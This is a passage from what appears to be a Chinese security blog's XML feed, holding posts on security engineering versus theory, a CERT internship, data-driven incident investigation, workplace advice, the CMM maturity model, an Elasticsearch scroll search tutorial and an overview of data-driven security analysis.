        <content type="html"><![CDATA[<h1 id="关于工程化和基础理论研究的思考"><a href="#关于工程化和基础理论研究的思考" class="headerlink" title="关于工程化和基础理论研究的思考"></a>关于工程化和基础理论研究的思考</h1><p>工程化怕落地，理论研究怕工程验证。这两个问题叠加，就成了一个如今安全的现状：理论研究飘飘欲仙，落地实践能跑就行。对于一个只接触安全不久的人来说，我还是不能对安全届评头论足的，这不是我所能做的。但就实习和自己学习过程中所看到的问题，进行一个思考。</p><h2 id="要么做要么干脆别做"><a href="#要么做要么干脆别做" class="headerlink" title="要么做要么干脆别做"></a>要么做要么干脆别做</h2><p>现在的乙方安全厂商所做的东西，如果从核心上去看，最大的问题就是在疯狂对标，而核心能力的支持却少。一方面，是有着成果的压力，一方面是由于资源的支持不到位。为什么会有这两者呢？说白了，还是对于公司的短期利益不够明显。我花50万雇几个安服的人就能解决的事，为什么要花500万投入到一个就算未来收益明显，但没有几个人能做的事情呢？除非公司有得是钱，那我不怕，不然一边亏损，一边给落地困难的项目不断支持，是不“值得”的。</p><p>因此，简单来说，我觉得工程化的事情，就像谈恋爱一样。不想花钱，但想得到回报，不想付出时间精力，但也对外宣传关系甜美，这种行为，很快就会被戳穿、破灭。如果真成了，那也是主导的人实在太强，逆风而上，而那真的只是凤毛麟角。谈恋爱，不以结婚为目的的恋爱，就是耍流氓。做工程，不以完美验收为目的的工程，就是做着玩玩。</p><p>该砍就砍，该给钱、给资源，就被抠着了。</p><h2 id="基础理论研究别怕没成果"><a href="#基础理论研究别怕没成果" class="headerlink" title="基础理论研究别怕没成果"></a>基础理论研究别怕没成果</h2><p>有一个学长说过，现在国内的安全研究基本上没有纯的。这么说可能太偏激，却揭穿了国内安全研究的一个比较尴尬的伤疤：</p><p>没成果——没名气——没资金——没支持——没动力——没人做。也许有人会说，这挺对呀，这就是“市场”机制的淘汰呀。确实，没毛病，但很多时候，我们误会了最开始的，那个“成果”的定义。</p><p>如果安全的理论研究，只是搭积木（基于XXX的各种XXX），只是挑骨头（挖漏洞），那我觉得也挺“幸福”，未来的发展太慢。作为一个初入安全世界的学习者，我是真的很敬佩那些对漏洞研究、攻防技术充满热情的人，真的。我觉得自己在这方面完全不如他们。但同时，我也觉得，安全对乙方、对甲方来说，都应该支持一大部分给那些没有所谓“产出”的人。他们的研究也许在很长的时间内无法落地、无法工程验证，甚至提出的理论都在被内部否定，但只要做起来，重视起来，那么量变肯定会引起质变。</p><p>别再看不起成天学习，没有“产出”的那部分人了。</p><h2 id="关于自己"><a href="#关于自己" class="headerlink" title="关于自己"></a>关于自己</h2><p>我想做安全运营（对安全运营的定义也许各不相同，后续文章会补充自己对安全运营的理解，也可查看我的<a href="https://y1ng.org/TheRoadOfSO/">“安全运营之路”</a>）方向，因为我对自己的认知是：技术深入研究的手比较笨，基础理论研究的脑子跟不上。那我的优点是什么呢，自认为是可以将各种知识点快速地吸收、整合、产生关联、输出idea、并能组织去实现。这是我在学习安全事件调查中挖掘出来的。因此我对自己的定位是，串联工程化与理论研究，推动安全整体有价值的落地。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 安全运营 </tag>
            
            <tag> 感了个悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习这段时间</title>
      <link href="/2020/08/29/%E5%AE%9E%E4%B9%A0%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4/"/>
      <url>/2020/08/29/%E5%AE%9E%E4%B9%A0%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="实习这段时间"><a href="#实习这段时间" class="headerlink" title="实习这段时间"></a>实习这段时间</h1><p>在奇安信CERT实习的这段时间里，真的学习到很多，了解到很多。我的师傅和我的直接领导，给我的这次机会，真的是让我感到无比的幸运，我常常觉得，人要是没有感恩的心，就像是块石头一样。这是我的第一份工作，这份研究性质的工作，让我不必很多地担心于业务的事情。没有业务压力，专心于研究、学习，真是非常好的机会。</p><h2 id="关于技术"><a href="#关于技术" class="headerlink" title="关于技术"></a>关于技术</h2><p>从技术上来看，以前自己学习的时候，了解到的很多技术、对概念和实际的应用都是很模糊的。包括威胁情报、威胁狩猎和安全数据分析等等，以前是明白有方向在，也去看了很多文章说具体包括哪些。但在这边，才真的知道，原来威胁情报的落地形式是这样的，可以作为事件研判的参考，可以作为自动化事件调查的数据源，可以应用在某个具体模型的检测判断中等等。就像是一张羊皮卷，里面有我感兴趣的东西，它一点点展开，一点点浮现在我的眼前，在读的时候也需要埋下头苦苦理解，一起身就发现：原来是这样！</p><p>技术这块，对我最大的感触点就在于，每个方向都有非常深入的点，这种积累，你的技术能力，真的每天都不能放下积累，尤其是在刚刚入门的阶段，比你厉害的人比你更努力，同样，比你更努力的人，比你更厉害。找到适合自己的方向，动手去做，去实现，去思考这个过程。按照安全的话来讲，就是：理解战术（T），掌握技术（T），熟悉流程（P）。</p><h2 id="关于职业发展"><a href="#关于职业发展" class="headerlink" title="关于职业发展"></a>关于职业发展</h2><p>从职业发展上来看，我现在逐渐明确自己想做什么，想有一个怎么样的方向了。师傅和我说，在职业这块，有两种，一种是纵向地发展，在某个领域有非常深入的研究，能坐得住去研究、去深挖里面的奥秘，他的价值对于整体而言在于：让一个厉害的人做厉害的事情；还有一种人是横向地发展，在多个方向都有自己的涉猎、思考和想法，也有各种关于执行的能力，他的价值对于整体而言在于：让一堆厉害的人，做厉害的事情。</p><p>对于我个人而言，我更喜欢后者，并且完全认同前者的做法。如果我能做得到，我两者都会去抓住，但我的目标是实现后者。这是因为，对我想从事的这个安全行业来说，我认为这个行业有非常非常多有意思的人，他们履历各不相同，都在以一种蓬勃发展的姿态在行业里展现。但有一个问题，就是对于一个客体而言，总体的安全能力并不完全等于其中每个人个人能力之和，更别说是积数。</p><p>我想在这个行业里，甚至说是在我的人生规划里，我想发挥的价值，是想从一个整体的视角去“编排”安全能力。这是一个长远的目标，也是我现在这阶段，现在这段体会里，所想做的事情。</p><h2 id="关于认知"><a href="#关于认知" class="headerlink" title="关于认知"></a>关于认知</h2><p>私以为，学习的意义，在于用知识去更好地探索这个世界。这个过程放大来看，也许是这样：你今天学了一个横向越权的业务逻辑漏洞——&gt;你对业务安全的理解多了一点——&gt;理解安全防护不是靠一个防火墙能解决，还有业务逻辑——明白了开发流程、风控流程和安全响应之间需要的一个整体关联——从企业安全建设视角去组织安全、风控与开发。</p><p>只有你学得更多，你才能见到更全面的世界；只有你学得更深，你才能了解更深层次的世界。</p><p>我们生下来时，都是好奇宝宝，不同的宝宝在路上越走越不同，我还是希望做一个好奇宝宝会更好玩一些，哪怕碰壁多，但至少没有遗憾。</p><h2 id="关于交流"><a href="#关于交流" class="headerlink" title="关于交流"></a>关于交流</h2><p>向一个方向的大牛问问题，你的目标不是说让他很快给你解答，你的目标是让整个问题难倒他。因为请求别人帮忙，本质上，难听点，你是在利用别人的价值，而别人也需要和你进行同等的价值交换。非亲非故，你想问技术问题的话，你如果让这个大牛都暂时不太能解答，说明你的技术问题在这个技术领域内，你已经很厉害了，你都能在这块难到他了，他通过解答也能获得知识。这就是一种对等的价值交换，而不是单纯的卖人情。</p><h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>看到的不足，看到的机会，没有做的事情，给自己列几点：</p><ul><li><p>持续学习，今日事今日毕</p></li><li><p>做好时间维度的职业规划</p></li><li><p>多想一点，多思考一点，多问是什么？为什么？能怎么样？</p></li><li><p>学习——思考——实践——反馈——学习……</p></li><li><p>圈子很重要，同时也要学会突破自己的视角</p></li><li><p>感恩，感恩，感恩</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 感了个悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于数据驱动事件调查的思考</title>
      <link href="/2020/08/24/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E4%BA%8B%E4%BB%B6%E8%B0%83%E6%9F%A5%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/08/24/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E4%BA%8B%E4%BB%B6%E8%B0%83%E6%9F%A5%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="关于数据驱动事件调查的思考"><a href="#关于数据驱动事件调查的思考" class="headerlink" title="关于数据驱动事件调查的思考"></a>关于数据驱动事件调查的思考</h1><p><em>基于事件调查的分析能力提升</em></p><p>在实际的情况下，各种安全设备、系统会产生海量的数据。对于企业来说，很重要的一件事情，就是要从这些疑似的安全告警中，根据一些模型和算法提取有价值的安全事件。</p><p>众所周知，传统的安全设备，往往都是以特征检查为主，模型检查的能力受限（短时间窗口），也比较弱。那么，在这个基础之上，我们需要做的一件事，就可以是写好确定的分析模型，这个分析模型需要结合安全方面的专家经验，也需要结合数据分析、机器学习学习技术（比如异常检测）。</p><p>模型可以帮助我们以一个效率更高的方式对告警数据做一个初步的判断，把人工经验转化为了机器脚本去执行。但模型偏向于的单个能力的检查。比如模型能检查钓鱼邮件行为，但却不能梳理出一个APT事件。因为对于模型，我们的定义是让其做好特征检查做不到的事情，但没有要求它能到一个完整事件的梳理。</p><p>此时我们就可以引入分析能力这个概念。分析能力所涵盖的事情，是基于事件而设计的，而不是单个能力的检查。在基于数据驱动的应急响应过程中，分析师所需要做的，简单来说就是从数据（告警、流量等）中找到一个真实的入侵事件，而事件包含的内容则可以参考3W1H（Who When What How）。而这个找3W1H的过程，我们在经过特征、模型这两个阶段后，已经能对单方面攻击行为有一个初步的筛选了，比如某某IP在某某时间，对某某资产进行了XXX攻击。也就是，经过了特征和模型两个阶段，我们对3W初步进行了解决。但还剩下1H，攻击者是如何做到这个攻击的，并且要对3W做更精准的研判。</p><p>此时，我们的分析平台就可以来亮相了。分析平台单从技术上来说，它应该具备上面我们所受的分析能力，并且这是它的核心。同时，作为一个与用户直接接触的平台，它还承担着业务能力、管理能力等其他产品方向的功能。</p><p>那么，分析平台的分析能力如何体现呢？</p><p>我们先来看一个人类分析师需要做哪些事情。首先，他需要对入侵事件进行调查，这是首要的。入侵调查后，我们可以得出一个围绕3W1H的报告。然后，他需要基于这个事件做一个风险点识别（从更大的角度，哪里出的问题体现了系统的哪个方面有问题），做一个风险处置（如何让这个风险点不再造成危害）。</p><p>回到我们刚刚到问题，分析平台的分析能力，应该如何区别于特征和模型呢？对应上面对人类分析师所做之事的简单概括，我们可以知道，分析能力这项核心能力的体现，是要在一个更大的层面，即不再局限于某个事件，而是把多个事件整合起来，产出<strong>Knowledge</strong>。这个Knowledge可以由很多形式展现，以下列举几个我个人认为的：</p><ul><li>同源分析</li><li>事件归并</li><li>攻击评估</li><li>攻击者画像<ul><li>攻击者能力</li><li>攻击者行为</li></ul></li><li>TTPs（技战术组合）提炼</li><li>威胁趋势、预测</li><li>威胁狩猎</li></ul><p>所以，我们基于事件调查所进行的分析能力提升，总体来说是这三个阶段：特征——模型——分析。目前，特征阶段已经比较成熟，但覆盖率和精准率还有待提升。模型阶段，目前比较好的方案是结合安全方面专家能力和机器学习算法，在某个攻击行为上，检测的覆盖率和精准率已经挺不错了，但因为攻击、漏洞的千变万化，以及各种组合和绕过，网络环境和生产环境的错综复杂，使得复杂情况下的检测情况不是很完美。而分析阶段，目前不管是商业化的还是开源的，还是学术届的研究，只能说是一个对分析师的辅助，大多是工具性质，只能进行半自动化的利用。</p><p>未来就在眼前，把握机会。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 安全之路 </tag>
            
            <tag> 安全数据分析 </tag>
            
            <tag> 事件调查 </tag>
            
            <tag> 数据驱动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任务不能说不行</title>
      <link href="/2020/08/21/%E4%B8%8D%E8%83%BD%E8%AF%B4%E4%B8%8D%E8%A1%8C/"/>
      <url>/2020/08/21/%E4%B8%8D%E8%83%BD%E8%AF%B4%E4%B8%8D%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="任务不能说不行"><a href="#任务不能说不行" class="headerlink" title="任务不能说不行"></a>任务不能说不行</h1><p>今天师傅和我讲了一个职场的“小秘密”，比较有趣，记录一下。</p><p>在工作中有时会接到十分不合理的需求，但这个时候往往不能直接说不行。比如一个需求是一周做完20个模型（一个很大的工作量），那该怎么说呢？你可以先去调查、研究，要去明白，哪些投入产出比高，优先做这些。然后也要评估自己的时间全部做这些高产出时总价值高？还是分散开来多做点，但每个都做得不够好时总价值比较高？</p><p>然后你就要把这些东西和领导、客户说清楚，除非你的领导和客户失了智，哪怕在听你说完这些利弊之后，就会很清楚。但他们也会有自己的考虑。比如有时候，虽然模型检测率不高，但模型多的话，竞争力会更强，领导出于这种考虑无可厚非。</p><p>1年有1年的做法，1个月有一个月的做法，1个礼拜有一个礼拜的做法。如果你直接拒绝任务，错很大程度上全在你（第三方视角下）；如果你做了评估，领导/客户还是要坚持自己的方案，那责任就会很大程度上不在你（第三方视角）。</p><p>职场上，给你的任务不能说不行，只有需求合不合理，评估有没有去做，方案有没有优化。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 所谓职场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMM-能力成熟度模型</title>
      <link href="/2020/08/12/CMM-%E8%83%BD%E5%8A%9B%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B/"/>
      <url>/2020/08/12/CMM-%E8%83%BD%E5%8A%9B%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="CMM能力成熟度模型"><a href="#CMM能力成熟度模型" class="headerlink" title="CMM能力成熟度模型"></a>CMM能力成熟度模型</h1><p>在产品调研过程中遇到的一个评论，说是要准备好成熟度模型，才能让XXX产品更适合你的需求。可以看到，对于甲方来说，一个成熟度模型关乎自身的评估，也关乎对外采取活动的决策。</p><p>而之前不是很了解这个概念，因此补充一下笔记。</p><h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><blockquote><p>   能力成熟度模型（Capability Maturity Model for Software，英文缩写为SW-CMM，简称CMM）[1]</p></blockquote><blockquote><p>   CMM是指“能力成熟度模型”，是对于软件组织在定义、实施、度量、控制和改善其<a href="https://wiki.mbalib.com/wiki/%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B" target="_blank" rel="noopener">软件过程</a>的实践中各个发展阶段的描述。[1]</p></blockquote><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200812115113.png"></p><p>图：CMM模型的五个阶梯[1]</p><p>众所周知，管理的最终目的是为了提高整体的效率，而CMM模型就是为了提供一个参考的方案，帮助提高软件生产的效率（质量与速度）、优化软件过程（即软件生命周期的一系列活动的集合）。</p><h2 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h2><p>把软件开发当作一个过程，就像制造业的工厂流水线是有一套流程规范的，同样，采取这套流程规范，也是为了软件开发能产出质量更好的产品。</p><p>在实际生产情况下，软件开发的过程和软件开发管理之间是不一样的。例如对于一个安全产品的开发人员来说，他们需要一个安全能力的支持，但安全能力的支持又依赖于研究人员。研究人员的技术成果——开发人员手里拿到的技术文档，这个过程中会产生太多的问题，因此我们需要对这个过程进行一个改进。使得整个生产线能以一个正向反馈的循环存在，最终提高产品的质量。</p><h2 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h2><p>把软件开发当作一个过程，就像制造业的工厂流水线是有一套流程规范的，同样，采取这套流程规范，也是为了软件开发能产出质量更好的产品。</p><p>软件过程的改善不能追求一蹴而就，需要以增量的形式逐步改进，可以参考CMM的不同等级。</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200812115015.png"></p><p>Table. CMM的分级、特征与要求[1]</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 能力成熟度模型，MBA智库 <a href="https://wiki.mbalib.com/wiki/%E8%83%BD%E5%8A%9B%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">https://wiki.mbalib.com/wiki/%E8%83%BD%E5%8A%9B%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>研究和业务</title>
      <link href="/2020/08/05/%E7%A0%94%E7%A9%B6%E5%92%8C%E4%B8%9A%E5%8A%A1/"/>
      <url>/2020/08/05/%E7%A0%94%E7%A9%B6%E5%92%8C%E4%B8%9A%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="研究和业务"><a href="#研究和业务" class="headerlink" title="研究和业务"></a>研究和业务</h1><ul><li>研究和业务是两样东西，纯研究是可以是长时间的，精益求精的；业务是需要在关键点上尽早地保质保量达成，然后争取后面的时间进行研究和优化。</li><li>在刚接触工作的时候，我就遇到了这样一个错误，我把一个任务展开得太大，导致它像默克尔树一样，不停地在展开，并且新的展开都会影响前面的内容。导致任务越来越复杂，时间却越来越少。其实，我完全可以先搭骨架，能跑起来就行，就算非常简单一样也没关系，至少出了第一版。而我们的策略，就是做出能力范围、时间限度内的第一版，然后交给其他的部门，给自己争取时间来优化。不然就会，你一直在精益求精，别人就在那等着，你的工作成果也无法让别人了解。这样对于一个团队来说，是不利的。而这种精益求精的精神，对于研究，是非常有必要的，哪怕过1年、2年，只要研究出来了，就算过时了，你的研究过程也是一个很好的经验。所以，要把业务和研究划开，心里要有个度，做事情要有对事情本身的规划，也要对时间和“上下文”环境做一个规划。</li><li>同样，在工作中接到一个任务，心里也可以有这样的两个概念：实验版和生产版<ul><li>实验版：理论要充足，但可以不稳定、不准确，最主要是<strong>创新</strong></li><li>生产版：要相对稳定，经过比较详细的实践研究，最主要是<strong>效率</strong></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Works </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感了个悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解scroll search</title>
      <link href="/2020/07/24/scroll-search/"/>
      <url>/2020/07/24/scroll-search/</url>
      
        <content type="html"><![CDATA[<h1 id="理解Scroll-Search"><a href="#理解Scroll-Search" class="headerlink" title="理解Scroll Search"></a>理解Scroll Search</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>  ES的搜索是分2个阶段进行的，即Query阶段和Fetch阶段。 Query阶段比较轻量级，通过查询倒排索引，获取满足查询结果的文档ID列表。 而Fetch阶段比较重，需要将每个shard的结果取回，在协调结点进行<strong>全局</strong>排序。 通过From+size这种方式分批获取数据的时候，随着from加大，需要全局排序并丢弃的结果数量随之上升，性能越来越差。</p><p>  而Scroll查询，先做轻量级的Query阶段以后，免去了繁重的全局排序过程。 它只是将查询结果集，也就是doc id列表保留在一个上下文里， 之后每次分批取回的时候，只需根据设置的size，在每个shard内部按照一定顺序（默认doc_id续)， 取回这个size数量的文档即可。 </p><p>  由此也可以看出scroll不适合支持那种实时的和用户交互的前端分页工作，其主要用途用于从ES集群分批拉取大量结果集的情况，一般都是offline的应用场景。 比如需要将非常大的结果集拉取出来，存放到其他系统处理，或者需要做大索引的reindex等等。</p><p>  <a href="https://elasticsearch.cn/people/wood" target="_blank" rel="noopener"><br>  kennywu76</a>，<a href="https://elasticsearch.cn/question/2935" target="_blank" rel="noopener">https://elasticsearch.cn/question/2935</a></p></blockquote><h2 id="方法比较"><a href="#方法比较" class="headerlink" title="方法比较"></a>方法比较</h2><h3 id="与常规search相比"><a href="#与常规search相比" class="headerlink" title="与常规search相比"></a>与常规search相比</h3><p>首先，我们要记住ES的搜索是分两步进行的，第一步相当于更具倒排索引找对应数据的ID，第二步是从各个分片中取回ID对应的数据。</p><p>第一个阶段较为轻量化，因为是只是在倒排索引里找。第二个阶段比较重量，因为其不仅需要到各个分片中取回数据，还需要在进行全局排序（因为从各个分片中取回的数据可能是散乱的），因为我们需要找到在查询的时间内变化的结果，如果变化则丢弃。</p><p>而滚动查询（scroll search）则面去了全局排序的过程，fetch到结果后，直接保存在查询结果集，到设置到的size后直接取回，此时并不考虑已经取回的数据是否变化了。</p><p>在数据量非常大的情况下，size也相对较小的话，会产生一种滚动显示的效果，但要记住滚动并不是为了实时的用户响应，而是为了处理大量的数据。并且scroll也很难</p><h3 id="与Scan相比"><a href="#与Scan相比" class="headerlink" title="与Scan相比"></a>与Scan相比</h3><p>相比于常规的search，scroll search虽说在不进行全局排序的，但在每个size内进行搜索得到结果时也是会进行排序的。如果我们不考虑排序，只想要找有对应的数据，那么可以用scan。scan模式不进行全局排序，也不进行“分步”排序。</p><h2 id="为什么要排序？"><a href="#为什么要排序？" class="headerlink" title="为什么要排序？"></a>为什么要排序？</h2><p>为什么常规的search和scroll search都要进行排序呢？因为在真实环境中我们有很多复杂的需求，不是每次查询都能跑一遍全部的量的</p><p>例如，企业级日志的数量每天都有成千上万条，如果我们需要在一个月内的日志数据（分布式存储）中，找到某一个时间段的全部请求IP，如果不排序，我们就无法定位到一个具体的时间段。因为分布式存储时，每个数据都在一个切片中，在搜索时，需要对每个切片进行一下排序，才能知道，第XXX条就是我们要查的开始文档，每个切片都要排序，然后在常规search后又要进行进行一次全局排序来汇总。</p><p>如果此时使用scan方式，那么相当于我们在每个切片中都进行着内容匹配，不作任何排序，从头到尾地进行着比对。这个是不现实的，也是不符合需求的。</p><p>此时，我们就可以使用scroll search，为什么呢？理由有4点：</p><ul><li>数据量很大，scroll search减少了全局排序的时间</li><li>数据是冷的，过往时间的日志数据不会变动</li><li>我们的目的是找数据，不是有边查边改动或者其他复杂的需求</li><li>我们要设置在一定的范围，需要在查询时进行过滤设置</li></ul><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul><li>最好是冷数据，或者数据变动不是非常频繁</li><li>数据量很大，我们需要减少时间</li><li>目的是拉取结果集</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET trans_0x0/_search?scroll=1m&amp;pretty=<span class="literal">true</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>: &#123;</span><br><span class="line">    <span class="string">"match"</span>: &#123;</span><br><span class="line">      <span class="string">"dip.keyword"</span>: <span class="string">"202.75.106.45"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  , <span class="string">"size"</span>: 20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述的例子中，我们在<code>_search</code>接口后添加参数<code>scroll</code>并设置其为1分钟。代表在1分钟内我们认为数据不发生改动，即索引维持的时间。如果需要断点下载，在真实网络环境中情况复杂，网速并没有那么好，那么我们可以设置得长一点。</p><p>然后请求体中，我们查询dip.keyword符合”202.75.106.45”这个IP的结果。</p><p>设置size为20表示每次查询的结果，获取的、显示的结果为20条文档。</p>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据驱动安全概要</title>
      <link href="/2020/06/02/security/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%A6%82%E8%A7%88/"/>
      <url>/2020/06/02/security/%E6%95%B0%E6%8D%AE%E9%A9%B1%E5%8A%A8%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E6%A6%82%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<h1 id="数据驱动安全入门学习"><a href="#数据驱动安全入门学习" class="headerlink" title="数据驱动安全入门学习"></a>数据驱动安全入门学习</h1><p>安全威胁数据是安全数据中的一种，其中对应的处理过程是：“威胁数据——&gt; SIEM（安全信息与事件管理）——&gt;安全保障”。</p><p>类比地看，数据驱动安全，就是从数据的角度，经过不同阶段的处理，最后综合地达到驱动安全保障的过程。现在这一阶段，应用的范围更加广泛，“包括入侵检测、漏洞挖掘与分析、欺诈检测、钓鱼攻击检测、SPAM检测等等。”[2]</p><blockquote><p>“数据驱动安全的本质是一种高层次、跨学科的自动化手段，其内涵包括了数据分析、人工智能、大数据、云计算等等。数据分析技术作为一种重要的自动化手段，必然会消灭掉一部分简单、重复工作内容，进一步提高行业从业人员的进入门槛。在未来可以预期的很长一段时间内，数据分析都将是安全工程师和研究人员的有力工作助手。” </p></blockquote><h2 id="安全数据分析能力图"><a href="#安全数据分析能力图" class="headerlink" title="安全数据分析能力图"></a>安全数据分析能力图</h2><p>从数据中提取知识，辅助解决安全问题</p><ul><li>Hacking Skills</li><li>Math &amp; Statistics knowledge</li><li>Substantive Expertise（先验专家经验）</li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424222024.png"></p><p>图：安全数据分析能力图</p><h2 id="安全数据分析落地情况"><a href="#安全数据分析落地情况" class="headerlink" title="安全数据分析落地情况"></a>安全数据分析落地情况</h2><p>给予历史经验样本下的拟合学习</p><p>基于知识的对抗</p><h3 id="文本内容监测"><a href="#文本内容监测" class="headerlink" title="文本内容监测"></a>文本内容监测</h3><ul><li>WAF </li><li>WebShell检测</li><li>二进制病毒检测</li><li>网页敏感内容检测</li><li>明码流量检测</li></ul><h3 id="简单统计和假设检验"><a href="#简单统计和假设检验" class="headerlink" title="简单统计和假设检验"></a>简单统计和假设检验</h3><ul><li>暴力破解攻击检测</li><li>异地登录检测</li><li>真实入侵证据发现</li></ul><h3 id="时序建模和时序异常监测算法"><a href="#时序建模和时序异常监测算法" class="headerlink" title="时序建模和时序异常监测算法"></a>时序建模和时序异常监测算法</h3><ul><li>DDoS</li><li>CC</li><li>定点API接口爆破检测</li></ul><h3 id="相似性匹配算法"><a href="#相似性匹配算法" class="headerlink" title="相似性匹配算法"></a>相似性匹配算法</h3><ul><li>缺乏可解释性，目前更多用于辅助专家决策</li></ul><h2 id="安全数据学习概览"><a href="#安全数据学习概览" class="headerlink" title="安全数据学习概览"></a>安全数据学习概览</h2><h3 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h3><p><strong>问题——数据——特征——模型</strong></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424223510.png"></p><p>图：机器学习方法论</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>安全问题抽象</p><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>数据采集</p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p>特征工程</p><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p>模型构建</p><p>效果评估</p><h3 id="ML-Workflow"><a href="#ML-Workflow" class="headerlink" title="ML Workflow"></a>ML Workflow</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424224043.png"></p><p>图：ML Workflow</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><h4 id="更快、更全、更准"><a href="#更快、更全、更准" class="headerlink" title="更快、更全、更准"></a>更快、更全、更准</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424230247.png"></p><p>图：安全数据分析的目标</p><h3 id="安全问题抽象"><a href="#安全问题抽象" class="headerlink" title="安全问题抽象"></a>安全问题抽象</h3><h4 id="分类、聚类、降维"><a href="#分类、聚类、降维" class="headerlink" title="分类、聚类、降维"></a>分类、聚类、降维</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424230655.png"></p><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>减少误报率的方法：基于业务来减少误报率。对不同业务场景下，对单一的业务逐个进行进行验证，不断将误报的样本送回进行训练，从而降低误报率</p><h3 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h3><p><strong>安全数据来源、安全数据类型</strong></p><p>最优数据量：多到特征明显，少到几乎无噪音干扰</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424231925.png"></p><p>图：数据挖掘</p><h3 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200424233617.png"></p><p>图：数据清洗</p><h3 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h3><h4 id="过滤、封装、嵌入"><a href="#过滤、封装、嵌入" class="headerlink" title="过滤、封装、嵌入"></a>过滤、封装、嵌入</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425001133.png"></p><h3 id="模型-1"><a href="#模型-1" class="headerlink" title="模型"></a>模型</h3><h4 id="数据脚本小子"><a href="#数据脚本小子" class="headerlink" title="数据脚本小子"></a>数据脚本小子</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200425001333.png"></p><h4 id="策略选择"><a href="#策略选择" class="headerlink" 